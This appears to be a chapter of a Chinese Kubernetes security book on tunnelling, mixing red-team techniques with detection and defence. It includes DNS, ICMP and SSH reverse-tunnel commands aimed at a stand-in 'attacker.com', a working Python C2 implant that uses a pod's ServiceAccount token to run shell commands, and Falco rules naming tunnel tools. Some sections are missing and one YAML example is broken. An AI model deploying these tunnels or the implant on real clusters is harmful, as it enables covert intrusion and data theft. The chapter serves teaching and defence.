## 11.1 隧道技术原理

### 11.1.1 隧道的协议本质

隧道（Tunneling）是一种将一种网络协议的流量封装到另一种协议中进行传输的技术。从协议分层的视角来看：

```
OSI 七层模型中的隧道实现：

┌──────────────────────────────────────────────────────────────┐
│ 应用层 (L7)  │ HTTP 隧道、DNS 隧道、WebSocket 隧道、SSH 隧道   │
│ 表示层 (L6)  │ SSL/TLS VPN（加密隧道）                        │
│ 会话层 (L5)  │ SOCKS 代理、SSH 端口转发                        │
│ 传输层 (L4)  │ TCP 隧道、UDP 隧道、SCTP 隧道                   │
│ 网络层 (L3)  │ IP-in-IP、GRE、IPIP、6in4、IPsec                │
│ 数据链路层(L2)│ VXLAN、GRE L2、PPP                             │
│ 物理层 (L1)  │ 专线、光纤                                      │
└──────────────────────────────────────────────────────────────┘

隧道可以在任意两层之间建立，上层协议不关心下层封装细节。
```

**隧道的三个核心要素**：

1. **封装（Encapsulation）**：原始数据被放入新协议的数据字段
2. **传输（Transport）**：封装后的数据通过现有网络传输
3. **解封装（Decapsulation）**：接收方提取原始数据

```
封装过程示例（HTTP 隧道）：

原始 SSH 数据包：
┌─────────────┬─────────────┬─────────────┐
│ SSH Header  │ SSH Payload │ SSH Trailer │
└─────────────┴─────────────┴─────────────┘

封装为 HTTP POST：
┌─────────────┬─────────────┬─────────────┬─────────────────────┐
│ HTTP Header │ Content-Type│ Base64(SSH) │ HTTP Trailer        │
│ POST /t     │ application │  Payload    │                     │
└─────────────┴─────────────┴─────────────┴─────────────────────┘

最终 TCP 包：
┌────────┬────────┬────────┬────────────────────────────────────┐
│ IP Hdr │ TCP Hdr│ HTTP   │  Base64(SSH Payload)               │
│        │        │ Header │                                    │
└────────┴────────┴────────┴────────────────────────────────────┘
```

### 11.1.2 隧道分类与检测难度

| 类型 | 封装层 | 代表协议 | 检测难度 | 原因 |
|------|--------|---------|---------|------|
| **网络层隧道** | L3 | GRE、IPIP、IPsec | ⭐ 低 | 特殊协议号易被识别 |
| **传输层隧道** | L4 | SSH（-L/-R/-D） | ⭐⭐ 中 | 固定端口，有握手特征 |
| **应用层隧道** | L7 | HTTP CONNECT | ⭐⭐⭐ 高 | 类似正常 Web 流量 |
| **隐蔽隧道** | 滥用协议 | DNS、ICMP | ⭐⭐⭐⭐ 很高 | 无异常端口，看起来像正常查询 |
| **协议内隧道** | L7 内部 | WebSocket、gRPC | ⭐⭐⭐⭐⭐ 极高 | 完全正常的协议升级 |

### 11.1.3 为什么 K8s 环境容易成为隧道温床

K8s 环境的特性使得隧道攻击有独特优势：

1. **内部网络扁平化**：Pod 之间默认可以互相通信
2. **DNS 基础设施完善**：CoreDNS 提供可靠的 DNS 解析服务
3. **API 访问便捷**：ServiceAccount 自动挂载，Pod 天然有 API 访问能力
4. **网络策略宽松**：许多集群没有配置严格的 NetworkPolicy
5. **监控盲区**：东西向流量（Pod-to-Pod）常被忽略

## 11.2 K8s 原生隧道机制详解

### 11.2.1 kubectl port-forward 的 WebSocket 实现

`kubectl port-forward` 并不是简单的端口映射，它使用 SPDY 或 WebSocket 协议在客户端和 kubelet 之间建立全双工通道：

```
完整的 port-forward 建立流程：

客户端                         API Server                    kubelet
   │                              │                            │
   │ 1. POST /api/v1/namespaces/  │                            │
   │    default/pods/nginx/       │                            │
   │    portforward               │                            │
   │ ────────────────────────────►│                            │
   │                              │                            │
   │ 2. 101 Switching Protocols   │                            │
   │ ◄────────────────────────────│                            │
   │    Upgrade: SPDY/3.1         │                            │
   │                              │                            │
   │ 3. SPDY 流建立               │                            │
   │    stream-id=1 (本地:8080    │                            │
   │    → Pod:80)                 │                            │
   │ ◄════════════════════════════╪════════════════════════════►│
   │                              │                            │
   │ 4. 数据流                    │                            │
   │    ┌───────┐                 │                            │
   │    │本地   │ ──SPDY流──►    │  ──HTTP流──►              │
   │    │:8080  │                 │      (kubelet)             │
   │    └───────┘                 │                            │
   │                              │                            │
```

**关键安全风险**：

1. **绕过 NetworkPolicy**：port-forward 流量来自 kubelet（节点 IP），不是 Pod IP，Pod 级别的 egress 策略不生效
2. **暴露面扩大**：`--address 0.0.0.0` 将端口绑定到所有接口
3. **权限放大**：任何能创建 port-forward 的用户都可以访问集群内任意 Pod 的端口

```bash
# 查看当前活动的 port-forward
# 方法1：查看 API Server 审计日志
grep "portforward" /var/log/audit.log | jq '.requestReceivedTimestamp, .user.username'

# 方法2：查看节点上的 kubelet 连接
ss -tlnp | grep kubectl

# 危险操作示例：将内部数据库暴露到外部
kubectl port-forward svc/postgres 5432:5432 --address 0.0.0.0
# 任何能访问该节点 IP:5432 的人都可以连接数据库
```

### 11.2.2 kubectl proxy 的 HTTP 隧道

kubectl proxy 在本地启动一个 HTTP 代理服务器，自动处理认证：

```bash
# 本地 8001 代理到 API Server（使用当前 kubeconfig 凭证）
kubectl proxy --port=8001

# 通过代理访问（无需额外认证）
curl http://localhost:8001/api/v1/namespaces/default/pods

# 危险配置：暴露到外部，接受任何 Host 头
kubectl proxy --address=0.0.0.0 --accept-hosts='.*'
# 任何能访问该端口的人都可以操作整个集群

# 限制只能访问特定 API 路径
kubectl proxy --port=8001 --api-prefix=/api/v1/namespaces/default
```

### 11.2.3 Service 类型的隧道效应

```bash
# NodePort 扫描：攻击者发现内部服务
nmap -p 30000-32767 --open -sS <node-ip>

# 防御：限制 NodePort 范围
# /etc/kubernetes/manifests/kube-apiserver.yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --service-node-port-range=30000-30010  # 默认 30000-32767

# 节点防火墙限制
iptables -A INPUT -p tcp --dport 30000:32767 \
  -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 30000:32767 -j DROP

# LoadBalancer 的安全组配置
# 确保只开放必要的端口和源 IP
```

### 11.2.4 Ingress 的隧道风险

Ingress Controller 作为集群入口，可能被滥用：

```yaml

metadata:
  name: malicious-tunnel

  rules:
  - host: tunnel.attacker.com

      - path: /
        pathType: Prefix
        backend:
          service:
            name: tunnel-proxy
            port:
              number: 8080
```

## 11.3 红队隧道攻击技术

### 11.3.1 DNS 隧道深度分析

DNS 隧道利用 DNS 查询和响应的数据字段传输数据，是最隐蔽的隧道之一：

```
DNS 隧道的数据编码过程：

原始命令: "whoami"
Base32 编码: "E5SWK2DFNUQWC2LJ"
分割为标签（每段最长63字符）: "E5SWK2DF.NUQWC2LJ"
完整域名: "E5SWK2DF.NUQWC2LJ.attacker.com"

DNS 查询包：
┌────────────────────────────────────────────────────────────┐
│ DNS Header                                                 │
│  Transaction ID: 0x1234                                    │
│  Flags: 0x0100 (Standard Query)                            │
│  Questions: 1                                              │
├────────────────────────────────────────────────────────────┤
│ Question Section                                           │
│  Name: E5SWK2DF.NUQWC2LJ.attacker.com                     │
│  Type: TXT                                                 │
│  Class: IN                                                 │
└────────────────────────────────────────────────────────────┘

响应包携带命令结果：
┌────────────────────────────────────────────────────────────┐
│ Answer Section                                             │
│  Name: E5SWK2DF.NUQWC2LJ.attacker.com                     │
│  Type: TXT                                                 │
│  TTL: 300                                                  │
│  Data: "cm9vdAo=" (Base64 of "root\n")                     │
└────────────────────────────────────────────────────────────┘
```

**K8s 中的 DNS 隧道实现**：

```bash
# 方法1：使用 dnscat2（最成熟）
# 服务端（攻击者 VPS）
docker run --rm -p 53:53/udp local/dnscat2 \
  server --secret=mysecret attacker.com

# 客户端（在 Pod 中）
docker run --rm local/dnscat2 \
  client --dns server=<attacker-dns>,port=53 \
  --secret=mysecret attacker.com

# 方法2：使用 iodine（IP over DNS）
# 服务端
iodined -f -P mypassword 10.0.0.1 tunnel.attacker.com

# 客户端（Pod 中）
iodine -f -P mypassword <attacker-ip> tunnel.attacker.com
# 现在 tun0 接口可用，可以路由任何流量
```

**DNS 隧道检测指标（DPI 深度包检测）**：

| 指标 | 正常值 | 隧道特征 | 检测方法 |
|------|--------|---------|---------|
| 查询域名长度 | < 50 字符 | > 100 字符 | 正则匹配 |
| TXT 查询比例 | < 5% | > 30% | 流量统计 |
| 子域名熵值 | 低（有意义） | 高（随机/Base32） | 信息熵计算 |
| 查询频率 | 分散 | 固定间隔（心跳） | 时间序列分析 |
| A 记录返回 IP | 正常 | 看起来随机 | IP 信誉检查 |
| 查询方向 | 外部域名 | 指向特定 C2 域 | 域名黑名单 |

```bash
# CoreDNS 日志分析检测 DNS 隧道
cat << 'EOF' > detect_dns_tunnel.sh
#!/bin/bash
# 检测超长域名查询
kubectl logs -n kube-system -l k8s-app=kube-dns --tail=1000 | \
  grep -oP '[a-zA-Z0-9]{50,}' | \
  sort | uniq -c | sort -rn | head -20

# 检测高频 TXT 查询
kubectl logs -n kube-system -l k8s-app=kube-dns --tail=1000 | \
  grep "type: TXT" | \
  awk '{print $1}' | sort | uniq -c | sort -rn | head -10

# 检测异常查询模式（固定间隔）
kubectl logs -n kube-system -l k8s-app=kube-dns --tail=5000 | \
  grep -oP '\d{2}:\d{2}:\d{2}' | \
  awk -F: '{print $3}' | sort | uniq -c | sort -rn | head
EOF
chmod +x detect_dns_tunnel.sh
```

### 11.3.2 ICMP 隧道

ICMP Echo Request/Reply 的数据字段可以携带任意数据：

```
正常 ICMP Echo：
┌────────┬────────┬────────┬────────┬────────────┐
│ Type 8 │ Code 0 │ Checksum │ ID    │ Sequence  │
│ Request│        │          │       │           │
├────────┴────────┴────────┴────────┴────────────┤
│ Data: 56 bytes (默认)                            │
│ "abcdefghijklmnopqrstuvwabcdefghi..."           │
└─────────────────────────────────────────────────┘

ICMP 隧道：
┌────────┬────────┬────────┬────────┬────────────┐
│ Type 8 │ Code 0 │ Checksum │ ID    │ Sequence  │
├────────┴────────┴────────┴────────┴────────────┤
│ Data: 1400+ bytes                                │
│ EncryptedPayload(data)                           │
│ 高熵值，无规律                                   │
└─────────────────────────────────────────────────┘
```

```bash
# 工具：pingtunnel（Go 实现，支持加密）
# 服务端（攻击者）
pingtunnel -type server -key mysecretkey

# 客户端（Pod 内）
pingtunnel -type client -l :4455 -s <server-ip> \
  -t <server-ip>:4455 -sock5 1 -key mysecretkey

# 测试 SOCKS5 代理
curl --socks5 127.0.0.1:4455 http://internal.service
```

**ICMP 隧道检测**：

```bash
# 使用 tcpdump 检测异常 ICMP 大小
tcpdump -i any icmp -n -tttt | \
  awk '{if ($NF > 100) print $0}'  # 正常 ping 约 64 bytes

# Falco 规则检测 ICMP 隧道
- rule: ICMP Tunneling
  desc: Detect large ICMP packets
  condition: >
    spawned_process and
    (proc.name="pingtunnel" or proc.name="ptunnel" or
     proc.name="icmpsh")
  output: ICMP tunneling tool detected
  priority: CRITICAL
```

### 11.3.3 SSH 隧道家族

SSH 是功能最丰富的隧道工具：

```bash
# === 本地端口转发（-L）===
# 将远程集群内部服务映射到攻击者本地
ssh -N -L 3306:postgres.default.svc.cluster.local:3306 \
  -i ~/.ssh/id_rsa user@node-ip
# 攻击者本地访问 127.0.0.1:3306 即访问集群数据库

# === 远程端口转发（-R）===
# 反向隧道：内网主机主动连接攻击者
ssh -N -R 8888:localhost:22 attacker.com
# 攻击者通过 attacker.com:8888 回连内网 SSH

# === 动态端口转发（-D）===
# SOCKS5 代理
ssh -N -D 1080 user@node-ip
# 配置浏览器/工具使用 127.0.0.1:1080 SOCKS5 代理

# === 组合使用 ===
# 多层跳板
ssh -J bastion@jumpserver \
  -L 8080:internal-app.default.svc:80 \
  user@k8s-node
```

### 11.3.5 K8s API 作为 C2 通道

利用 K8s API 本身进行命令控制，流量完全合法：

```python
#!/usr/bin/env python3
"""K8s API C2 通道示例（教育用途）"""
import requests
import base64
import time
import subprocess
import json

API = "https://kubernetes.default.svc"
TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

with open(TOKEN_PATH) as f:
    TOKEN = f.read().strip()
with open(NAMESPACE_PATH) as f:
    NAMESPACE = f.read().strip()

HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

def get_command():
    """从 ConfigMap 获取命令"""
    try:
        resp = requests.get(
            f"{API}/api/v1/namespaces/{NAMESPACE}/configmaps/c2-channel",
            headers=HEADERS, verify=CA_PATH, timeout=10
        )
        if resp.status_code == 200:
            data = resp.json().get("data", {})
            encoded_cmd = data.get("command", "")
            if encoded_cmd:
                return base64.b64decode(encoded_cmd).decode()
    except Exception:
        pass
    return None

def send_output(output):
    """将结果写回 ConfigMap"""
    encoded = base64.b64encode(output.encode()).decode()
    payload = {
        "data": {"output": encoded}
    }
    try:
        requests.patch(
            f"{API}/api/v1/namespaces/{NAMESPACE}/configmaps/c2-channel",
            headers={**HEADERS, "Content-Type": "application/merge-patch+json"},
            json=payload, verify=CA_PATH, timeout=10
        )
    except Exception:
        pass

def main():
    while True:
        cmd = get_command()
        if cmd and cmd != "PING":
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    text=True, timeout=30
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = "Command timeout"
            except Exception as e:
                output = f"Error: {e}"
            send_output(output)
        time.sleep(30)  # 30 秒心跳

if __name__ == "__main__":
    main()
```

**为什么这种 C2 极难检测**：

1. 流量完全合法：使用标准 K8s API
2. 认证有效：使用合法的 ServiceAccount Token
3. 无异常端口：通过 HTTPS 443 通信
4. 与正常控制面流量混合：大量 Pod 都在访问 API

## 11.4 K8s 攻防靶标分析

### 11.4.1 靶标分级与价值

```
┌─────────────────────────────────────────────────────────────┐
│                     战略级靶标                               │
├─────────────────────────────────────────────────────────────┤
│  etcd 数据库                                                 │

│  ├─ 获取方式：节点访问、证书窃取、API 读取                   │
│  ├─ 防御：静态加密、节点隔离、证书轮换                       │
│  └─ 价值：★★★★★ 获取 = 完全控制集群                        │
├─────────────────────────────────────────────────────────────┤
│  kubeconfig 管理员凭证                                       │
│  ├─ 包含：管理员证书/密钥或 Token                           │
│  ├─ 获取方式：节点文件窃取、Git 泄露、备份泄露               │
│  ├─ 防御：短期凭证、多因素认证、定期轮换                     │
│  └─ 价值：★★★★★                                            │
├─────────────────────────────────────────────────────────────┤
│  云厂商 IAM 凭证（AK/SK、Instance Profile）                 │
│  ├─ 包含：云基础设施完全访问权限                             │
│  ├─ 获取方式：Pod 元数据服务、Secret                        │
│  ├─ 防御：IRSA/Pod Identity、最小权限、监控                 │

```

### 11.4.2 完整攻击路径分析


### 11.5.2 核心检测规则

```yaml
# Falco 隧道检测规则集
- rule: Reverse Shell Detection
  desc: Detect reverse shell connections
  condition: >
    spawned_process and
    shell_procs and
    inbound_outbound and
    fd.sport != 22
  output: >
    Reverse shell detected
    (user=%user.name command=%proc.cmdline connection=%fd.name)
  priority: CRITICAL

- rule: Unauthorized Port Forward
  desc: Detect unauthorized port-forward
  condition: >
    k8s.audit.verb=create and
    k8s.audit.subresource=pods/portforward and
    not ka.user.name in ("admin", "ops-team")
  output: >
    Unauthorized port-forward by %ka.user.name
  priority: WARNING
  source: k8s_audit

- rule: Tunnel Tool Execution
  desc: Detect known tunneling tools
  condition: >
    spawned_process and
    proc.name in ("dnscat2", "iodine", "ptunnel", "pingtunnel",
                  "wstunnel", "websocat", "frpc", "frps",
                  "nps", "chisel")
  output: >
    Tunneling tool executed: %proc.cmdline
  priority: CRITICAL

- rule: Suspicious DNS Query Pattern
  desc: Detect suspicious DNS queries
  condition: >
    spawned_process and
    (proc.name=dig or proc.name=nslookup) and
    evt.args contains ".xyz"
  output: >
    Suspicious DNS query: %proc.cmdline
  priority: WARNING
```

### 11.5.3 网络策略防御

```yaml
# 默认拒绝所有出站（白名单模式）
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress

---
# 只允许必要的出站连接
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-egress-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53

---
# 只允许特定 Pod 访问外部
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-external-specific
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-gateway
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 203.0.113.0/24  # 支付网关 IP
    ports:
    - protocol: TCP
      port: 443
```

## 11.11 本章小结

| 主题 | 关键点 |
|------|--------|
| **隧道本质** | 协议封装，可在 OSI 任意层建立 |
| **K8s 原生隧道** | port-forward（SPDY/WebSocket）、proxy、NodePort |
| **攻击隧道** | DNS（最隐蔽）、ICMP、SSH、WebSocket、K8s API C2 |
| **检测体系** | 网络层（DPI/DNS分析）、主机层（Falco）、控制面（审计） |
| **防御策略** | 默认拒绝出站、最小权限、持续监控 |
| **靶标分级** | 战略级（etcd/kubeconfig）→ 战术级（Token）→ 操作级（业务） |
| **靶场资源** | Kubernetes Goat、BadPods、Killer Shell、CloudFoxable |

**攻防精髓**：
1. **红队视角**：K8s 提供了丰富的隐蔽通信渠道——DNS、API、WebSocket 都可以作为隧道载体
2. **蓝队视角**：单一检测手段容易被绕过，必须建立网络+主机+控制面的多层检测体系
3. **核心原则**：默认拒绝出站、最小权限 Pod、持续审计监控
